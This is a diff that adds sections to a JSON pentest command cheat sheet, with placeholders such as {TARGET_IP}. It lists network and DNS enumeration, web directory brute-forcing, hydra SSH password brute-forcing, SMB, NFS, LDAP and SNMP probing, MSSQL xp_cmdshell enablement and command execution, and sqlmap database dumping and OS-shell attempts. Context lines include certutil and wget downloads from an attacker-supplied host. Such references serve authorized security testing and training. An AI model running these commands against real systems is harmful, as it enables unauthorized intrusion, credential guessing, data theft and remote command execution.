@@ -21,5 +21,361 @@
     { "os": "Linux", "cmd": "scp file.txt {USER}@{IP}:/tmp/" },
     { "os": "Windows", "cmd": "certutil -urlcache -split -f http://{IP}:{PORT}/file.exe file.exe" },
     { "os": "Linux", "cmd": "wget http://{IP}:{PORT}/file.sh -O /tmp/file.sh" }
+  ],
+  "enumeration2": [
+    {
+      "os": "Linux",
+      "cmd": "nmap {TARGET_IP}",
+      "description": "Basic TCP Scan (Top 1000 ports)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -sS {TARGET_IP}",
+      "description": "SYN Stealth Scan"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -sT {TARGET_IP}",
+      "description": "TCP Connect Scan"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sudo nmap -sU {TARGET_IP}",
+      "description": "UDP Scan (requires root)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -p 21,22,80,443,3389 {TARGET_IP}",
+      "description": "Scan specific ports"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -p- {TARGET_IP}",
+      "description": "Scan all ports (0-65535)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -sV {TARGET_IP}",
+      "description": "Service Version Detection"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -O {TARGET_IP}",
+      "description": "OS Detection"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -A {TARGET_IP}",
+      "description": "Aggressive Scan (OS, Service, Script Detection, Traceroute)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -sC {TARGET_IP}",
+      "description": "Default Script Scan"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -sC -sV -oA nmap_scan_{TARGET_IP} {TARGET_IP}",
+      "description": "Combine commonly used flags for quick initial scan"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -Pn {TARGET_IP}",
+      "description": "No Ping (Treat host as online)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -oA {filename} {TARGET_IP}",
+      "description": "Output to all formats (Nmap, Greppable, XML)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -T4 {TARGET_IP}",
+      "description": "Timing Templates (T0-T5, T4 is aggressive/normal)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nslookup {TARGET_IP}",
+      "description": "Standard DNS lookup (by IP)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nslookup {DOMAIN}",
+      "description": "Standard DNS lookup (by Domain)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nslookup {DOMAIN} {DNS_SERVER_IP}",
+      "description": "Specific DNS server lookup"
+    },
+    {
+      "os": "Linux",
+      "cmd": "dig axfr @{TARGET_IP} {DOMAIN}",
+      "description": "DNS zone transfer attempt (AXFR)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "host {DOMAIN}",
+      "description": "Host enumeration (forward lookup)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "host {TARGET_IP}",
+      "description": "Reverse DNS lookup"
+    },
+    {
+      "os": "Linux",
+      "cmd": "dnsrecon -d {DOMAIN} -a",
+      "description": "DNS Reconnaissance Tool (full enumeration)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "dnsrecon -d {DOMAIN} -t axfr",
+      "description": "DNS Reconnaissance Tool (zone transfer)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "curl -I http://{TARGET_IP}",
+      "description": "Basic HTTP request (banner grabbing)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "curl -I https://{TARGET_IP}",
+      "description": "Basic HTTPS request (banner grabbing)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "dirb http://{TARGET_IP} /usr/share/wordlists/dirb/common.txt",
+      "description": "Directory/File Brute-forcing (Dirb)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "gobuster dir -u http://{TARGET_IP} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_results.txt",
+      "description": "Directory/File Brute-forcing (Gobuster)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "gobuster dir -u http://{TARGET_IP} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt",
+      "description": "Directory/File Brute-forcing (Gobuster with extensions)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nikto -h {TARGET_IP}",
+      "description": "Nikto (Web server scanner)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "wpscan --url http://{TARGET_IP} --enumerate p,u,vp --api-token {WPSCAN_API_TOKEN}",
+      "description": "WPScan (WordPress scanner)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sublist3r -d {DOMAIN} -o subdomains.txt",
+      "description": "Subdomain enumeration (Sublist3r)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "amass enum -d {DOMAIN}",
+      "description": "Subdomain enumeration (Amass)"
+    }
+  ],
+  "service_specific_enumeration": [
+    {
+      "os": "Linux",
+      "cmd": "smbclient -L //{TARGET_IP} -N",
+      "description": "List SMB shares (null session)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "smbmap -H {TARGET_IP}",
+      "description": "List SMB shares with smbmap"
+    },
+    {
+      "os": "Linux",
+      "cmd": "smbclient //{TARGET_IP}/{SHARE_NAME} -U {UserName}%{Password}",
+      "description": "Connect to an SMB share"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -p 445 --script smb-enum-shares.nse,smb-enum-users.nse,smb-security-mode.nse {TARGET_IP}",
+      "description": "Nmap SMB enumeration scripts"
+    },
+    {
+      "os": "Linux",
+      "cmd": "enum4linux {TARGET_IP}",
+      "description": "Enumerate SMB users, shares, and policies"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sudo mount -t cifs //{TARGET_IP}/{SHARE_NAME} /mnt/smb_share -o username={UserName},password={Password},domain={Domain_Name}",
+      "description": "Mount an SMB share from Linux"
+    },
+    {
+      "os": "Linux",
+      "cmd": "ftp {TARGET_IP}",
+      "description": "Connect to FTP (then 'anonymous' for user/pass)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -p 21 --script ftp-anon.nse,ftp-bounce.nse,ftp-vsftpd-backdoor.nse {TARGET_IP}",
+      "description": "Nmap FTP scripts"
+    },
+    {
+      "os": "Linux",
+      "cmd": "put {LOCAL_FILE_PATH}",
+      "description": "Upload file via FTP (after connecting)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "get {REMOTE_FILE_PATH}",
+      "description": "Download file via FTP (after connecting)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "ssh {UserName}@{TARGET_IP}",
+      "description": "Connect via SSH"
+    },
+    {
+      "os": "Linux",
+      "cmd": "hydra -l {UserName} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP}",
+      "description": "SSH Brute-force (single user)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "hydra -L {USER_LIST_FILE} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP}",
+      "description": "SSH Brute-force (user list)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "telnet {TARGET_IP} 25",
+      "description": "Connect to SMTP for manual enumeration (then VRFY, EXPN, RCPT TO)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "VRFY {UserName}",
+      "description": "SMTP VRFY command (after telnet)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "EXPN root",
+      "description": "SMTP EXPN command (after telnet)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "RCPT TO:{UserName}",
+      "description": "SMTP RCPT TO command (after telnet)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -p 25 --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} {TARGET_IP}",
+      "description": "Nmap SMTP user enumeration scripts"
+    },
+    {
+      "os": "Linux",
+      "cmd": "smtp-user-enum -M VRFY -U {USER_LIST_FILE} -t {TARGET_IP}",
+      "description": "SMTP user enumeration with smtp-user-enum"
+    },
+    {
+      "os": "Linux",
+      "cmd": "snmpwalk -c public -v1 {TARGET_IP}",
+      "description": "Walk SNMP tree (community 'public', v1)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "snmpwalk -c public -v2c {TARGET_IP}",
+      "description": "Walk SNMP tree (community 'public', v2c)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "for c in public private manager; do snmpwalk -c $c -v1 {TARGET_IP} 2>/dev/null | grep -i 'sysDescr'; done",
+      "description": "Check for common SNMP community strings"
+    },
+    {
+      "os": "Linux",
+      "cmd": "snmp-check {TARGET_IP}",
+      "description": "Enumerate SNMP details with snmp-check"
+    },
+    {
+      "os": "Linux",
+      "cmd": "showmount -e {TARGET_IP}",
+      "description": "Show exported NFS shares"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sudo mount -t nfs {TARGET_IP}:{SHARE_PATH} /mnt/nfs_share -o nolock",
+      "description": "Mount an NFS share"
+    },
+    {
+      "os": "Linux",
+      "cmd": "ls -la /mnt/nfs_share",
+      "description": "Check permissions of mounted NFS share"
+    },
+    {
+      "os": "Linux",
+      "cmd": "ldapsearch -x -h {TARGET_IP} -b \"dc=example,dc=com\"",
+      "description": "LDAP search (anonymous bind, base domain)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "ldapsearch -x -h {TARGET_IP} -b \"dc=example,dc=com\" \"(objectClass=*)\"",
+      "description": "LDAP search (anonymous bind, all objects)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "ldapsearch -x -h {TARGET_IP} -b \"dc=example,dc=com\" \"(cn=*{UserName}*)\"",
+      "description": "LDAP search (anonymous bind, search for username)"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sqsh -S {TARGET_IP} -U {UserName} -P {Password}",
+      "description": "Connect to MSSQL using sqsh"
+    },
+    {
+      "os": "Windows",
+      "cmd": "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'",
+      "description": "MSSQL: Check xp_cmdshell status"
+    },
+    {
+      "os": "Windows",
+      "cmd": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+      "description": "MSSQL: Enable xp_cmdshell"
+    },
+    {
+      "os": "Windows",
+      "cmd": "EXEC xp_cmdshell 'whoami';",
+      "description": "MSSQL: Execute command via xp_cmdshell"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" --dbs",
+      "description": "SQLMap: Enumerate databases"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" -D {DATABASE_NAME} --tables",
+      "description": "SQLMap: Enumerate tables in a database"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" -D {DATABASE_NAME} -T {TABLE_NAME} --columns",
+      "description": "SQLMap: Enumerate columns in a table"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" -D {DATABASE_NAME} -T {TABLE_NAME} -C {COLUMN_NAME} --dump",
+      "description": "SQLMap: Dump data from a column"
+    },
+    {
+      "os": "Linux",
+      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" --os-shell",
+      "description": "SQLMap: Attempt OS shell via SQL injection"
+    }
+  ],
+  "vulnerability_scanning_basic": [
+    {
+      "os": "Linux",
+      "cmd": "nikto -h {TARGET_IP}",
+      "description": "Nikto (Web server scanner)"
+    }
   ]
 }
